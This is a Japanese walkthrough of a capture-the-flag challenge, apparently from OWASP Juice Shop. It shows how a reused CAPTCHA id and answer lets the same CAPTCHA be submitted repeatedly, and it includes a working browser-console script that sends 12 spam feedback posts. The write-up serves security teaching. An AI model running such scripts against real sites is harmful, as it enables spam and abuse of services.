# CAPTCHA Bypass ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** 自動化
**目標:** 10秒以内に10件以上のフィードバックを送信

---

## 思考プロセス

**ステップ1: CAPTCHAの仕組みを理解**
```
「CAPTCHAは自動送信を防ぐためのもの」
    ↓
「フィードバック送信時に計算問題を解かされる」
    ↓
「人間なら1回ずつ手動で送信するしかない...?」
```

**ステップ2: CAPTCHAの検証方法を調べる**
```
「DevTools の Network でリクエストを観察」
    ↓
「GET /rest/captcha で計算問題を取得」
    ↓
「POST で captchaId と captcha（答え）を送信」
    ↓
「1回使ったら無効になる？確認してみよう」
```

**ステップ3: 再利用の可能性を検証**
```
「同じ captchaId と答えで2回目の送信を試す」
    ↓
「成功した！CAPTCHAが再利用できる」
    ↓
「ループで12回送信すればチャレンジクリア」
```

## 実行手順

1. ログインする
2. Consoleで以下を実行:
   ```javascript
   // 1. CAPTCHAを1回取得
   const captcha = await fetch('/rest/captcha').then(r => r.json());
   const answer = eval(captcha.captcha).toString();
   const token = localStorage.getItem('token');

   // 2. 同じCAPTCHAで12回送信
   for (let i = 0; i < 12; i++) {
     await fetch('/api/Feedbacks/', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + token
       },
       body: JSON.stringify({
         captchaId: captcha.captchaId,
         captcha: answer,
         comment: 'Spam ' + i,
         rating: 1
       })
     });
   }
   console.log('Done!');
   ```

## 解説

**なぜこれが危険？**
- CAPTCHAは1回使ったら無効になるべき
- しかし同じCAPTCHA IDと答えを何度も再利用できる
- スパム送信やサービス妨害が可能になる

## 関連チャレンジ

- [Zero Stars](../difficulty-1/zero-stars.md)
- [Forged Feedback](forged-feedback.md)
